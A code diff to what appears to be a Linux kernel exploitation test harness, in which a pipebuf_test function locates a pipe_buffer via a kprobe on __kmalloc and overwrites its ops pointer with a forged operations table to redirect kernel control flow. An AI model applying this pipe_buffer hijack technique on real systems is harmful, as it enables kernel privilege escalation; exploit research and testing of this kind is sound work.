@@ -187,7 +187,7 @@ void pipebuf_test() {
     printf("kpwn_test: calling SYM_ADDR...\n");
     uint64_t rip_target = get_sym_addr("dump_stack");
 
-    kprobe_log* log = install_kprobe("__kmalloc", 1, "alloc_pipe_info");
+    kprobe_log* log = install_kprobe("__kmalloc", 1, "create_pipe_files");
 
     printf("calling pipe...\n");
     int fds[2];
@@ -202,17 +202,25 @@ void pipebuf_test() {
         //hexdump2(entry_ptr->call_stack, entry_ptr->call_stack_size);
         entry = (kprobe_log_entry*)(((uint8_t*) entry) + entry->entry_size);
     }
+
+    if (log->entry_count == 0) {
+        printf("error: pipe_buffer allocation could not be recorded...\n");
+        return;
+    }
     wait();
+
 
     uint64_t pb_addr = log->entries[0].return_value;
     pipe_buffer pb;
     arb_read(pb_addr, &pb, sizeof(pb));
     hexdump2(&pb, sizeof(pb));
     printf("ops ptr = 0x%lx\n", pb.ops);
+    printf("pipe_buffer addr = 0x%lx\n", pb_addr);
     wait();
 
     pipe_buf_operations fake_ops = { .release = 0x4141414141414141 };
     pb.ops = alloc_buffer(&fake_ops, sizeof(fake_ops));
+    printf("fake pipe_buf_ops addr = 0x%lx\n", pb.ops);
     arb_write(pb_addr, &pb, sizeof(pb));
 
     wait();
